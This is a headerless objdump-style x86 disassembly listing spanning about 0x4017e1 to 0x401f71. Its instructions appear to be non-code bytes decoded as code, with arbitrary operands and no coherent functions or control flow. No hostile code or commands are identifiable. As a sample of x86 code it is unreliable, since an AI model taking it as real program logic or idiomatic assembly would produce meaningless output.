  4017e1:	add    BYTE PTR [eax-0x2bbbbe80],al
  4017e7:	dec    edx
  4017e8:	add    DWORD PTR ds:0x50800000,0x9800000
  4017f2:	push   eax
  4017f3:	mov    WORD PTR [eax+0x23020209],es
  4017f9:	sub    BYTE PTR [eax+eax*1],bl
  4017fc:	xor    al,0x4
  4017fe:	or     BYTE PTR [esp+edx*1],dh
  401801:	and    BYTE PTR [eax],0x3a
  401804:	sbb    BYTE PTR [eax],al
  401806:	pop    ss
  401807:	sub    BYTE PTR [edx],al
  401809:	add    BYTE PTR [ecx+edx*2+0x1a0a0e],cl
  401810:	add    BYTE PTR [eax+0x45],0xb0
  401814:	rol    BYTE PTR [eax+esi*1],0x37
  401818:	and    BYTE PTR [eax],al
  40181a:	inc    edx
  40181b:	push   eax
  40181c:	inc    ecx
  40181d:	add    al,0x18
  40181f:	adc    BYTE PTR [eax],ah
  401821:	inc    eax
  401822:	push   es
  401823:	or     BYTE PTR [eax+0x4162c000],dl
  401829:	add    ah,BYTE PTR [ecx]
  40182b:	je     0x40186d
  40182d:	or     dl,BYTE PTR [edx]
  40182f:	sbb    cl,BYTE PTR [ecx]
  401831:	add    al,0x48
  401833:	mov    al,ah
  401835:	and    eax,0x512e2000
  40183a:	inc    eax
  40183b:	loopne 0x40188f
  40183d:	push   es
  40183e:	add    al,0x14
  401840:	add    BYTE PTR [ecx-0x3cce98d7],dh
  401846:	inc    eax
  401847:	add    al,BYTE PTR [ecx+0x4]
  40184a:	add    DWORD PTR ds:0x8440565b,eax
  401850:	push   es
  401851:	add    al,BYTE PTR [eax-0x7f7f3fff]
  401857:	pop    edx
  401858:	mov    al,0x25
  40185a:	add    BYTE PTR [eax],ah
  40185c:	and    DWORD PTR [ecx+0x8],ecx
  40185f:	loopne 0x401862
  401861:	adc    ah,cl
  401863:	rol    BYTE PTR ds:0x6980c003,cl
  401869:	add    eax,0x84209488
  40186e:	add    BYTE PTR [ecx],0x23
  401871:	lods   al,BYTE PTR ds:[esi]
  401872:	lods   al,BYTE PTR ds:[esi]
  401873:	add    BYTE PTR [ecx],al
  401875:	xor    al,0xc0
  401877:	and    DWORD PTR [edx+0x21],0xffffffe0
  40187b:	int3   
  40187c:	and    BYTE PTR [si],bl
  40187f:	sbb    BYTE PTR [eax+eax*1],al
  401882:	pop    ss
  401883:	add    DWORD PTR [eax+0x2122d0c0],edx
  401889:	adc    DWORD PTR [eax+0x9038010],edx
  40188f:	add    BYTE PTR [eax+ecx*1+0x41],al
  401893:	and    dl,BYTE PTR [eax+0x123802]
  401899:	xor    BYTE PTR [ebx],ah
  40189b:	sbb    BYTE PTR [eax+0x408c098],al
  4018a1:	xor    ah,BYTE PTR [eax]
  4018a3:	add    al,0x0
  4018a5:	add    BYTE PTR [ecx+0x70054260],dh
  4018ab:	add    DWORD PTR [eax-0x6e],edi
  4018ae:	push   esp
  4018af:	add    ecx,DWORD PTR [ecx]
  4018b1:	mov    DWORD PTR [eax-0x60],ecx
  4018b4:	daa    
  4018b5:	and    DWORD PTR [eax-0x78],esp
  4018b8:	retf   0x81b0
  4018bb:	and    BYTE PTR [esp+eax*1],cl
  4018be:	and    BYTE PTR [eax],0x0
  4018c1:	xor    BYTE PTR [eax+0x8],bh
  4018c4:	mov    WORD PTR [esi],cs
  4018c6:	add    al,0x65
  4018c8:	mov    BYTE PTR [eax],cl
  4018ca:	or     al,0x0
  4018cc:	push   eax
  4018cd:	add    dl,BYTE PTR [edx]
  4018cf:	or     DWORD PTR [ecx+0x8],0xc1203040
  4018d6:	inc    eax
  4018d7:	inc    eax
  4018d8:	add    bl,0x0
  4018db:	dec    ebx
  4018dc:	add    BYTE PTR [eax],0x20
  4018df:	adc    eax,DWORD PTR [eax+ebp*4]
  4018e2:	push   edx
  4018e3:	or     BYTE PTR [eax],0x1
  4018e6:	dec    esi
  4018e7:	add    BYTE PTR [esi+0x4],ah
  4018ea:	int3   
  4018eb:	adc    al,0x0
  4018ed:	add    BYTE PTR [edx],cl
  4018ef:	inc    eax
  4018f0:	rol    BYTE PTR [ecx],0xd4
  4018f3:	inc    eax
  4018f4:	add    BYTE PTR [eax],al
  4018f6:	and    BYTE PTR [eax],al
  4018f8:	or     BYTE PTR [eax],al
  4018fa:	and    BYTE PTR [eax+0x73ca4460],cl
  401900:	cmp    DWORD PTR [eax+edx*1-0x5ff5677f],edx
  401907:	ret    0xa6a3
  40190a:	xor    BYTE PTR [eax-0x58],0x88
  40190e:	or     BYTE PTR [edx+0x0],ah
  401911:	pop    es
  401912:	push   ecx
  401913:	dec    ebp
  401914:	add    DWORD PTR [esi],eax
  401916:	add    al,0x11
  401918:	popa   
  401919:	and    DWORD PTR [eax],edx
  40191b:	add    DWORD PTR [ecx],eax
  40191d:	add    BYTE PTR [eax+0x8087d0],al
  401923:	add    DWORD PTR [edx],0x890404c
  401929:	xor    BYTE PTR [eax+0x3c54840],ch
  40192f:	add    BYTE PTR es:[eax+0x130800],0x88
  401937:	add    BYTE PTR [edx],ah
  401939:	lods   al,BYTE PTR ds:[esi]
  40193a:	and    eax,0xffffff87
  40193d:	and    BYTE PTR [eax+eiz*4],ah
  401940:	add    BYTE PTR [eax],dl
  401942:	add    eax,DWORD PTR [eax]
  401944:	xchg   ebp,eax
  401945:	ret    
  401946:	add    al,BYTE PTR [ecx]
  401948:	adc    DWORD PTR es:[ecx+eax*2],ecx
  40194c:	or     BYTE PTR [eax+eax*2],dl
  40194f:	add    BYTE PTR ds:0x8588201,cl
  401955:	fiadd  DWORD PTR [esi-0x3ebd97ee]
  40195b:	mov    es,esp
  40195d:	shl    BYTE PTR [eax+eax*1],0x0
  401961:	and    al,0x14
  401963:	add    eax,0xc7406
  401968:	add    DWORD PTR [eax],esp
  40196a:	nop
  40196b:	add    dl,0x42
  40196e:	je     0x401910
  401970:	push   eax
  401971:	sub    BYTE PTR [ecx],cl
  401973:	adc    BYTE PTR [ecx],0x1
  401976:	fwait
  401977:	or     BYTE PTR [eax],al
  401979:	add    BYTE PTR [eax],al
  40197b:	lea    edx,[eax]
  40197d:	add    DWORD PTR [ecx+0xc408300],eax
  401983:	push   ss
  401984:	add    bh,BYTE PTR [ebx]
  401986:	leave  
  401987:	inc    esp
  401988:	sbb    BYTE PTR [eax],0x80
  40198b:	mov    eax,ds:0xd8400c
  401990:	inc    edx
  401991:	push   es
  401992:	add    BYTE PTR [edx],0x20
  401995:	or     al,0x2
  401997:	add    BYTE PTR [esi],0x20
  40199a:	inc    eax
  40199b:	add    BYTE PTR [eax],dh
  40199d:	adc    BYTE PTR [eax],dl
  40199f:	add    BYTE PTR [edx],al
  4019a1:	add    BYTE PTR [eax],cl
  4019a3:	mov    eax,ds:0x40c00524
  4019a8:	rol    BYTE PTR [ecx],0x60
  4019ab:	pop    edx
  4019ac:	sbb    BYTE PTR [eax+0x4f],al
  4019af:	xchg   edx,eax
  4019b0:	add    cl,0x10
  4019b3:	add    al,0x80
  4019b5:	add    BYTE PTR [eax+0x0],ch
  4019b8:	adc    BYTE PTR [ecx],0x5
  4019bb:	add    BYTE PTR [eax+0x6],dh
  4019be:	adc    al,BYTE PTR [eax]
  4019c0:	jge    0x401a23
  4019c2:	pusha  
  4019c3:	add    al,0x0
  4019c5:	add    BYTE PTR [ecx],0xe
  4019c8:	add    al,0x80
  4019ca:	inc    eax
  4019cb:	inc    ecx
  4019cc:	call   0x8cb8:0x62620058
  4019d3:	adc    DWORD PTR ds:0x2044cd,esp
  4019d9:	and    BYTE PTR [esi+0x4886c800],al
  4019df:	dec    ecx
  4019e0:	and    DWORD PTR [eax+0x12],eax
  4019e3:	add    BYTE PTR [eax],al
  4019e5:	inc    edi
  4019e6:	add    BYTE PTR [ecx+0x12],al
  4019e9:	dec    eax
  4019ea:	and    BYTE PTR [eax],al
  4019ec:	sbb    BYTE PTR [eax+ecx*4],dl
  4019ef:	add    eax,0x28800c90
  4019f4:	push   ebx
  4019f5:	adc    al,BYTE PTR [eax]
  4019f7:	pop    eax
  4019f8:	adc    al,0x0
  4019fa:	add    DWORD PTR [edx],eax
  4019fc:	and    al,BYTE PTR [eax]
  4019fe:	sbb    BYTE PTR [edx],dl
  401a00:	pop    edi
  401a01:	mov    al,0x0
  401a03:	xor    BYTE PTR [eax],al
  401a05:	mov    al,0x32
  401a07:	add    BYTE PTR [eax+0x44],al
  401a0a:	and    al,0x39
  401a0c:	dec    edx
  401a0d:	inc    eax
  401a0e:	add    BYTE PTR [eax],0xa0
  401a11:	add    BYTE PTR ds:0x80935023,dl
  401a17:	mov    eax,ds:0x8500045
  401a1c:	add    al,BYTE PTR [esi+0x19]
  401a1f:	add    DWORD PTR [esp+eax*1+0x1522149],esp
  401a26:	mov    DWORD PTR [eax+ebp*1],eax
  401a29:	sbb    DWORD PTR [edx+0x20],edx
  401a2c:	add    eax,0x1438000f
  401a31:	add    al,BYTE PTR [ecx-0x2fceef7d]
  401a37:	adc    BYTE PTR [eax],dl
  401a39:	add    cl,BYTE PTR [eax]
  401a3b:	xor    al,BYTE PTR [eax]
  401a3d:	scas   al,BYTE PTR es:[edi]
  401a3e:	add    al,0x25
  401a40:	add    al,0x4c
  401a42:	add    eax,0x48080201
  401a47:	dec    eax
  401a48:	or     al,0x5
  401a4a:	or     DWORD PTR [eax+0x46],ebx
  401a4d:	add    al,0x2
  401a4f:	xor    BYTE PTR [edx],0x4
  401a52:	push   eax
  401a53:	rol    BYTE PTR [eax+eax*2],0x2
  401a57:	and    al,BYTE PTR [eax+0x6618040]
  401a5d:	adc    ch,BYTE PTR [eax]
  401a5f:	inc    ecx
  401a60:	adc    BYTE PTR [esp+eax*2],cl
  401a63:	sbb    BYTE PTR [edx],ah
  401a65:	ret    0x58
  401a68:	and    al,0x82
  401a6a:	dec    eax
  401a6b:	ret    0x200
  401a6e:	push   es
  401a6f:	add    BYTE PTR [eax],al
  401a71:	or     al,BYTE PTR [edx+esi*4+0x12]
  401a75:	add    BYTE PTR [eax-0x7c],0x55
  401a79:	sub    BYTE PTR [ecx],al
  401a7b:	add    BYTE PTR [eax+0x400200a0],dl
  401a81:	xor    BYTE PTR [esi],al
  401a83:	adc    eax,DWORD PTR [eax]
  401a85:	sub    BYTE PTR [eax+0x210248a0],al
  401a8b:	or     BYTE PTR [eax],bl
  401a8d:	or     BYTE PTR [eax],al
  401a8f:	inc    eax
  401a90:	sbb    BYTE PTR [eax+0x12942004],dh
  401a96:	inc    eax
  401a97:	ret    
  401a98:	sbb    BYTE PTR [ebx],bl
  401a9a:	leave  
  401a9b:	sbb    BYTE PTR [eax],al
  401a9d:	test   BYTE PTR [eax],dh
  401a9f:	mov    ah,0x0
  401aa1:	add    DWORD PTR [eax+0x6],eax
  401aa4:	add    BYTE PTR [eax+ecx*1+0x6123024],0xc2
  401aac:	sub    eax,0x6987007
  401ab1:	xor    BYTE PTR [edx],0x12
  401ab4:	add    BYTE PTR [edx],0x11
  401ab7:	dec    edx
  401ab8:	es push ss
  401aba:	inc    eax
  401abb:	pop    es
  401abc:	adc    BYTE PTR [eax],al
  401abe:	add    BYTE PTR [eax+eax*1+0x8],dl
  401ac2:	test   al,0x3
  401ac4:	pop    eax
  401ac5:	add    al,0x98
  401ac7:	add    al,BYTE PTR [eax+eax*8-0xf]
  401acb:	and    eax,DWORD PTR [ebx]
  401acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ace:	dec    edx
  401acf:	and    BYTE PTR [ebx+0x4823cc5],ah
  401ad5:	pusha  
  401ad6:	inc    eax
  401ad7:	and    BYTE PTR [eax+ecx*1],dh
  401ada:	inc    ebp
  401adb:	push   ss
  401adc:	adc    BYTE PTR [eax],al
  401ade:	add    BYTE PTR [eax-0x7bff6fc0],bl
  401ae4:	or     BYTE PTR [eax+ebx*1+0x4],al
  401ae8:	add    BYTE PTR [eax],cl
  401aea:	add    BYTE PTR [ebp+0x8660080],0x9
  401af1:	push   ecx
  401af2:	stos   BYTE PTR es:[edi],al
  401af3:	add    DWORD PTR [edx+eax*4],edx
  401af6:	sub    esp,DWORD PTR [esi]
  401af8:	add    al,0x9a
  401afa:	jo     0x401b09
  401afc:	push   es
  401afd:	inc    ecx
  401afe:	pusha  
  401aff:	add    DWORD PTR [eax],eax
  401b01:	add    edx,DWORD PTR [eax]
  401b03:	adc    al,0x25
  401b05:	add    al,0x1a
  401b07:	xor    DWORD PTR [eax],ebp
  401b09:	and    al,0xb
  401b0b:	ss add al,0x0
  401b0e:	sbb    BYTE PTR [eax],ch
  401b10:	adc    BYTE PTR [eax+0x0],cl
  401b13:	inc    eax
  401b14:	test   BYTE PTR [edi],al
  401b16:	or     BYTE PTR [eax+0x21],cl
  401b19:	add    dl,BYTE PTR [eax]
  401b1b:	test   al,0x24
  401b1d:	and    al,BYTE PTR [eax+edx*1+0x25c18005]
  401b24:	sub    BYTE PTR [edx],bl
  401b26:	adc    BYTE PTR [esi+0x9421064],al
  401b2c:	or     DWORD PTR [eax+0x40b18085],ecx
  401b32:	and    cl,BYTE PTR [eax]
  401b34:	and    ah,BYTE PTR [ecx]
  401b36:	sub    al,0x4
  401b38:	or     BYTE PTR [eax],cl
  401b3a:	mov    BYTE PTR [esi],dl
  401b3c:	add    cl,dl
  401b3e:	add    al,0x1
  401b40:	xor    BYTE PTR [ecx+0xa38628a],0x65
  401b47:	xchg   edx,eax
  401b48:	adc    BYTE PTR [eax+eax*8+0x4a5108e0],ah
  401b4f:	inc    edi
  401b50:	pop    esp
  401b51:	hlt    
  401b52:	add    ah,BYTE PTR [ebp+0x30200008]
  401b58:	adc    ecx,DWORD PTR [esi]
  401b5a:	sub    BYTE PTR [eax],ah
  401b5c:	add    eax,0x55301264
  401b61:	mov    al,ds:0x9404200
  401b66:	inc    edx
  401b67:	add    DWORD PTR [edx],esp
  401b69:	inc    esp
  401b6a:	mov    WORD PTR [eax+0x404b4004],cs
  401b70:	add    BYTE PTR [eax-0x5e],al
  401b73:	les    esp,FWORD PTR [eax]
  401b75:	adc    BYTE PTR [ecx-0x45],dl
  401b78:	add    BYTE PTR [eax+0x25],ah
  401b7b:	mov    dl,0x0
  401b7d:	or     ah,BYTE PTR [esp+eiz*4]
  401b80:	or     BYTE PTR [eax],al
  401b82:	mov    al,ds:0x4802d02
  401b87:	inc    eax
  401b88:	mov    al,ds:0xc1041000
  401b8d:	add    BYTE PTR [eax-0xf],al
  401b90:	add    DWORD PTR [eax-0x7e],ecx
  401b93:	add    BYTE PTR [eax],ah
  401b95:	out    dx,al
  401b96:	and    DWORD PTR [esi-0x80],eax
  401b99:	add    al,0xa4
  401b9b:	mov    BYTE PTR [edx+0x2208684],bl
  401ba1:	pusha  
  401ba2:	mov    BYTE PTR [edx],al
  401ba4:	adc    esp,DWORD PTR [ecx+eax*4-0x3b]
  401ba8:	test   BYTE PTR [eax+0x25000002],cl
  401bae:	inc    edx
  401baf:	dec    eax
  401bb0:	add    DWORD PTR es:[ecx],eax
  401bb3:	add    BYTE PTR [eax-0x4fe7dfbf],al
  401bb9:	and    eax,DWORD PTR [edx]
  401bbb:	test   BYTE PTR [eax],al
  401bbd:	add    BYTE PTR [ecx+eax*8],bl
  401bc0:	inc    edx
  401bc1:	add    BYTE PTR [eax+eax*1],cl
  401bc4:	shl    DWORD PTR [ecx],1
  401bc6:	add    DWORD PTR [edx],0x2300241
  401bcc:	sub    al,BYTE PTR [eax]
  401bce:	add    ax,WORD PTR [eax]
  401bd1:	xor    al,0x20
  401bd3:	rol    DWORD PTR [eax],0x49
  401bd6:	test   eax,0x92849
  401bdb:	inc    edx
  401bdc:	sub    al,0xc
  401bde:	or     eax,0x36110c80
  401be3:	js     0x401c1d
  401be5:	sub    BYTE PTR [eax],dl
  401be7:	rcl    BYTE PTR [ecx],0x0
  401bea:	inc    ecx
  401beb:	push   es
  401bec:	jno    0x401c18
  401bee:	add    DWORD PTR [edx],0xffffffa0
  401bf1:	sbb    dh,BYTE PTR [eax]
  401bf3:	xor    BYTE PTR [esp+eax*1],0x34
  401bf7:	add    DWORD PTR [eax],ebx
  401bf9:	add    BYTE PTR [ecx],0x69
  401bfc:	add    dl,BYTE PTR [eax+0x11]
  401bff:	add    BYTE PTR [eax+eax*1],al
  401c02:	add    al,0x0
  401c04:	adc    BYTE PTR [eax],al
  401c06:	adc    eax,0x1441038a
  401c0b:	adc    DWORD PTR [eax+0x108015],eax
  401c11:	or     BYTE PTR [eax+eiz*1],ah
  401c14:	push   0x89009a1
  401c19:	mov    al,ds:0x6983ca0
  401c1e:	or     BYTE PTR [eax],al
  401c20:	inc    eax
  401c21:	mov    al,ds:0x8188d800
  401c26:	inc    eax
  401c27:	add    BYTE PTR [eax],dl
  401c29:	mov    al,es:0x42004440
  401c2f:	adc    BYTE PTR [eax],dh
  401c31:	sbb    cl,BYTE PTR [eax+0x3a]
  401c34:	add    BYTE PTR [edx+ecx*2],bh
  401c37:	sbb    dl,BYTE PTR [edx]
  401c39:	and    dh,BYTE PTR [eax+eax*1]
  401c3c:	add    al,BYTE PTR [eax]
  401c3e:	inc    esp
  401c3f:	adc    BYTE PTR cs:[esi],al
  401c42:	and    ah,BYTE PTR [ebx]
  401c44:	or     al,0x21
  401c46:	xchg   edx,eax
  401c47:	add    BYTE PTR [eax+0x0],dl
  401c4a:	dec    edx
  401c4b:	inc    eax
  401c4c:	nop
  401c4d:	pusha  
  401c4e:	shl    DWORD PTR [eax+0x10028110],1
  401c54:	add    al,BYTE PTR [eax+eax*4]
  401c57:	add    al,0x40
  401c59:	xor    ecx,DWORD PTR [ecx]
  401c5b:	and    eax,0x2a0110
  401c60:	adc    DWORD PTR [eax-0x16],eax
  401c63:	sub    DWORD PTR [ecx-0x60],eax
  401c66:	pop    eax
  401c67:	and    eax,0x808025b
  401c6c:	mov    BYTE PTR [ecx+0x0],ah
  401c6f:	mov    al,ds:0x182f1102
  401c74:	mov    ds:0x55e20040,al
  401c79:	sbb    ah,BYTE PTR [eax]
  401c7b:	ret    
  401c7c:	add    BYTE PTR [eax],ah
  401c7e:	add    BYTE PTR [eax+eax*1],al
  401c81:	add    DWORD PTR [ecx],eax
  401c83:	lock adc eax,DWORD PTR [eax]
  401c86:	test   DWORD PTR [eax+eax*1],esp
  401c89:	and    al,al
  401c8b:	push   ecx
  401c8c:	xchg   BYTE PTR [eax],dl
  401c8e:	enter  0x43d5,0x20
  401c92:	and    BYTE PTR [eax],al
  401c94:	xor    DWORD PTR [eax],esp
  401c96:	shl    BYTE PTR [eax],1
  401c98:	add    DWORD PTR [ecx],edx
  401c9a:	dec    ebx
  401c9b:	add    al,0x20
  401c9d:	push   eax
  401c9e:	cs inc edx
  401ca0:	and    BYTE PTR [edx],al
  401ca2:	and    al,BYTE PTR [ebp-0x80]
  401ca5:	and    al,al
  401ca7:	and    al,0x31
  401ca9:	add    BYTE PTR [eax],cl
  401cab:	imul   edi,DWORD PTR [esi],0x20183421
  401cb1:	and    BYTE PTR [eax],dh
  401cb3:	dec    eax
  401cb4:	leave  
  401cb5:	mov    al,BYTE PTR [eax]
  401cb7:	add    DWORD PTR [eax],ecx
  401cb9:	adc    BYTE PTR [ebx],dh
  401cbb:	cmp    cl,BYTE PTR [eax]
  401cbd:	inc    edx
  401cbe:	add    esp,DWORD PTR [ebp+0x0]
  401cc1:	add    eax,0x31080500
  401cc6:	add    BYTE PTR [edx+esi*1],bl
  401cc9:	inc    eax
  401cca:	je     0x401cee
  401ccc:	or     eax,0x61c00700
  401cd1:	inc    ecx
  401cd2:	add    BYTE PTR [eax-0x40],al
  401cd5:	inc    eax
  401cd6:	sbb    BYTE PTR [eax],cl
  401cd8:	inc    esp
  401cd9:	inc    ebx
  401cda:	adc    BYTE PTR [ebp+0x40102ec8],al
  401ce0:	rol    BYTE PTR [ecx+0x41],0x28
  401ce4:	adc    BYTE PTR [ecx],al
  401ce6:	xor    BYTE PTR [eax],al
  401ce8:	add    BYTE PTR [eax+0x12804000],0x11
  401cef:	pop    ebx
  401cf0:	add    BYTE PTR [eax-0x53],ah
  401cf3:	add    DWORD PTR [edx+0x0],eax
  401cf6:	add    BYTE PTR [eax],ah
  401cf8:	push   eax
  401cf9:	inc    edx
  401cfa:	add    BYTE PTR [eax+0x20],dh
  401cfd:	xchg   ecx,eax
  401cfe:	or     al,0x82
  401d00:	adc    cl,BYTE PTR [ecx]
  401d02:	inc    eax
  401d03:	and    BYTE PTR [eax],al
  401d05:	add    DWORD PTR [eax+0x443522],0x6412906
  401d0f:	push   es
  401d10:	add    al,0x71
  401d12:	push   esp
  401d13:	or     al,0xc2
  401d15:	loop   0x401d1c
  401d17:	sub    bl,BYTE PTR [ecx+eax*8]
  401d1a:	dec    edx
  401d1b:	adc    al,0x0
  401d1d:	dec    ebx
  401d1e:	add    bl,BYTE PTR [eax+0x20094]
  401d24:	add    ah,BYTE PTR [ecx]
  401d26:	je     0x401d38
  401d28:	adc    esp,DWORD PTR [edx]
  401d2a:	sub    DWORD PTR [ebx],edx
  401d2c:	ins    BYTE PTR es:[edi],dx
  401d2d:	dec    edi
  401d2e:	add    ecx,DWORD PTR [ecx]
  401d30:	or     cl,0x21
  401d33:	and    ah,BYTE PTR [eax]
  401d35:	add    BYTE PTR [eax],cl
  401d37:	sub    DWORD PTR [ecx],eax
  401d39:	or     DWORD PTR [eax],esi
  401d3b:	xchg   BYTE PTR [ecx],cl
  401d3d:	inc    esp
  401d3e:	add    BYTE PTR [edx-0x30000000],0x2
  401d45:	loopne 0x401cc7
  401d47:	add    al,0x24
  401d49:	add    DWORD PTR [ebp-0x60],eax
  401d4c:	adc    BYTE PTR [eax+0x61803002],ah
  401d52:	add    BYTE PTR [ebx+0x610b36],al
  401d58:	push   esp
  401d59:	les    eax,FWORD PTR [ecx]
  401d5b:	add    eax,0x34800221
  401d60:	es mov al,ah
  401d63:	add    BYTE PTR [edx],dl
  401d65:	and    BYTE PTR [edx],0x0
  401d68:	arpl   WORD PTR [eax],ax
  401d6a:	or     al,BYTE PTR [eax]
  401d6c:	adc    cl,al
  401d6e:	rol    DWORD PTR [eax],0xcc
  401d71:	add    al,BYTE PTR [ecx+ebx*2+0x2]
  401d75:	test   BYTE PTR [eax+0x5],ah
  401d78:	jb     0x401d93
  401d7a:	or     DWORD PTR [eax+eiz*1],eax
  401d7d:	cmp    BYTE PTR [eax],ah
  401d7f:	and    BYTE PTR [esi],dl
  401d81:	adc    BYTE PTR [eax],al
  401d83:	adc    BYTE PTR [eax],ah
  401d85:	add    al,0x90
  401d87:	xor    BYTE PTR [eax+0x20012084],0x80
  401d8e:	inc    ecx
  401d8f:	add    eax,DWORD PTR [eax]
  401d91:	mov    DWORD PTR [esi],esi
  401d93:	adc    BYTE PTR [eax],cl
  401d95:	push   esi
  401d96:	adc    eax,eax
  401d98:	xor    eax,0x2081238
  401d9d:	adc    DWORD PTR [ecx+0x32],eax
  401da0:	or     BYTE PTR [eax+eax*1],ch
  401da3:	push   ecx
  401da4:	inc    eax
  401da5:	out    0x16,al
  401da7:	loop   0x401da9
  401da9:	adc    al,0xb7
  401dab:	ins    BYTE PTR es:[edi],dx
  401dac:	and    BYTE PTR [eax+0x0],ah
  401daf:	inc    eax
  401db0:	add    al,0x0
  401db2:	push   ecx
  401db3:	adc    eax,0x41445011
  401db8:	add    eax,0xa318c100
  401dbd:	add    BYTE PTR [edx],al
  401dbf:	mov    WORD PTR [esi],ss
  401dc1:	add    BYTE PTR [edx],dl
  401dc3:	and    BYTE PTR [eax+0x83209d0],al
  401dc9:	push   0x78969408
  401dce:	add    BYTE PTR [esi+0x10490080],al
  401dd4:	and    al,0x82
  401dd6:	or     BYTE PTR [eax+0x2],0x24
  401dda:	mov    WORD PTR [ebx],es
  401ddc:	rol    BYTE PTR [ecx+0x50],0xa1
  401de0:	add    dl,BYTE PTR [edx]
  401de2:	pusha  
  401de3:	inc    eax
  401de4:	sub    BYTE PTR [eax-0x3fb75e90],al
  401dea:	pusha  
  401deb:	xor    al,0x20
  401ded:	add    BYTE PTR [edx],cl
  401def:	adc    BYTE PTR [ecx+0x4c],cl
  401df2:	or     DWORD PTR [eax+0x91237c],0x405a7a60
  401dfc:	ror    BYTE PTR [edx],1
  401dfe:	cmp    DWORD PTR [edx+eiz*8-0x7dbffe60],ebx
  401e05:	sub    BYTE PTR [eax],bl
  401e07:	adc    BYTE PTR [eax],dh
  401e09:	and    BYTE PTR [eax],ah
  401e0b:	mov    al,ds:0x2280c094
  401e10:	add    al,0xd4
  401e12:	add    DWORD PTR [ecx+0x61],ecx
  401e15:	add    BYTE PTR [eax-0x7f9ee8e0],cl
  401e1b:	or     BYTE PTR [eax-0x6c],bl
  401e1e:	sub    BYTE PTR [eax],al
  401e20:	or     al,0xc
  401e22:	dec    eax
  401e23:	dec    ecx
  401e24:	and    BYTE PTR [edx+0x2],al
  401e27:	sbb    BYTE PTR [eax+eax*1+0x4885254],al
  401e2e:	and    ah,BYTE PTR [eax+0x6]
  401e31:	and    DWORD PTR [edx],eax
  401e33:	adc    eax,0x414b3021
  401e38:	enter  0x152,0xda
  401e3c:	add    dl,0x4d
  401e3f:	dec    ebp
  401e40:	ret    0x600a
  401e43:	mov    DWORD PTR [eax+ebx*4],ecx
  401e46:	mov    al,ds:0x84050664
  401e4b:	add    BYTE PTR [edx+eax*4+0x1a],ah
  401e4f:	fs push es
  401e51:	loop   0x401e53
  401e53:	adc    DWORD PTR [eax],ebp
  401e55:	sbb    BYTE PTR [eax],0x80
  401e58:	inc    esp
  401e59:	add    al,BYTE PTR [ecx]
  401e5b:	adc    BYTE PTR [eax],cl
  401e5d:	or     al,al
  401e5f:	or     BYTE PTR [eax],al
  401e61:	or     al,0x28
  401e63:	adc    BYTE PTR [eax+ecx*4],al
  401e66:	inc    ecx
  401e67:	xor    BYTE PTR [ecx],cl
  401e69:	add    BYTE PTR [eax],dl
  401e6b:	add    al,0x80
  401e6d:	adc    DWORD PTR [edx+0x4c010001],eax
  401e73:	dec    eax
  401e74:	add    al,BYTE PTR [eax]
  401e76:	inc    edx
  401e77:	add    al,0x62
  401e79:	mov    al,ds:0x82048a80
  401e7e:	inc    edx
  401e7f:	sar    DWORD PTR [esi-0x7febefff],0x19
  401e86:	test   eax,0x422c00
  401e8b:	dec    ecx
  401e8c:	add    al,BYTE PTR [eax]
  401e8e:	add    BYTE PTR [edi],0x2
  401e91:	mov    al,0x0
  401e93:	inc    eax
  401e94:	repnz and al,0x88
  401e97:	and    BYTE PTR [edx],cl
  401e99:	xor    BYTE PTR [eax],al
  401e9b:	popa   
  401e9c:	xor    BYTE PTR [ecx],al
  401e9e:	adc    BYTE PTR [ebx+0x0],al
  401ea1:	add    BYTE PTR [ecx-0x3bb17ffb],cl
  401ea7:	add    DWORD PTR [edx],eax
  401ea9:	add    BYTE PTR [eax+0x20c00ec8],cl
  401eaf:	or     al,0x2
  401eb1:	or     dh,bl
  401eb3:	add    BYTE PTR [eax],cl
  401eb5:	sub    BYTE PTR [ecx],ah
  401eb7:	adc    BYTE PTR [eax-0x6ffd660c],bh
  401ebd:	add    al,0x30
  401ebf:	and    BYTE PTR [eax],dl
  401ec1:	adc    BYTE PTR [ecx-0x7eb53e50],ah
  401ec7:	ret    0x4205
  401eca:	xor    BYTE PTR [eax],al
  401ecc:	sub    ebp,DWORD PTR [eax+ecx*2]
  401ecf:	or     DWORD PTR [esi+0x0],edx
  401ed2:	adc    bl,BYTE PTR [esi]
  401ed4:	stos   DWORD PTR es:[edi],eax
  401ed5:	mov    DWORD PTR [eax-0x7d],eax
  401ed8:	xchg   ebx,eax
  401ed9:	sbb    BYTE PTR [eax],ch
  401edb:	add    BYTE PTR ds:0x480c0161,al
  401ee1:	sbb    BYTE PTR [eax-0x16],al
  401ee4:	and    al,0x6
  401ee6:	add    DWORD PTR [esi],ecx
  401ee8:	add    BYTE PTR [eax+0x16432c],al
  401eee:	inc    edi
  401eef:	adc    BYTE PTR [eax+ecx*2],0xc0
  401ef3:	jp     0x401ef6
  401ef5:	inc    ebp
  401ef6:	sub    BYTE PTR [eax+eax*4],ah
  401ef9:	mov    ds:0x1425c846,al
  401efe:	or     al,BYTE PTR [ecx]
  401f00:	test   BYTE PTR [eax+eax*4+0x18040a01],al
  401f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f08:	add    DWORD PTR [edx],esp
  401f0a:	pop    es
  401f0b:	add    DWORD PTR [ecx-0x7baeff20],ecx
  401f11:	inc    ecx
  401f12:	inc    eax
  401f13:	add    BYTE PTR [edx+0x8],dl
  401f16:	sbb    DWORD PTR [eax],0x350de068
  401f1c:	add    BYTE PTR [edx+0x9],cl
  401f1f:	add    al,BYTE PTR [eax]
  401f21:	add    al,BYTE PTR [eax]
  401f23:	call   0x20c0c0a8
  401f28:	or     eax,DWORD PTR [eax+0x12]
  401f2b:	or     BYTE PTR [eax+0x2],bl
  401f2e:	or     BYTE PTR [eax-0x6febfef0],al
  401f34:	dec    ebx
  401f35:	mov    BYTE PTR [eax+eax*1+0xec08121],dl
  401f3c:	xchg   esi,eax
  401f3d:	push   eax
  401f3e:	inc    edx
  401f3f:	lds    edi,FWORD PTR [eax+0x22022008]
  401f45:	loopne 0x401ec7
  401f47:	add    eax,0x87228a52
  401f4c:	dec    esp
  401f4d:	inc    eax
  401f4e:	push   es
  401f4f:	test   al,0x0
  401f51:	pop    esp
  401f52:	fs push es
  401f54:	and    cl,BYTE PTR [eax+0x62004840]
  401f5a:	and    BYTE PTR [eax],al
  401f5c:	add    BYTE PTR [ebp+0x40151411],ah
  401f62:	or     BYTE PTR [eax+0x0],al
  401f65:	add    BYTE PTR [ecx+0x61a07120],al
  401f6b:	or     cl,BYTE PTR [eax-0x3f1e72a0]
  401f71:	add    BYTE PTR [edx],dl
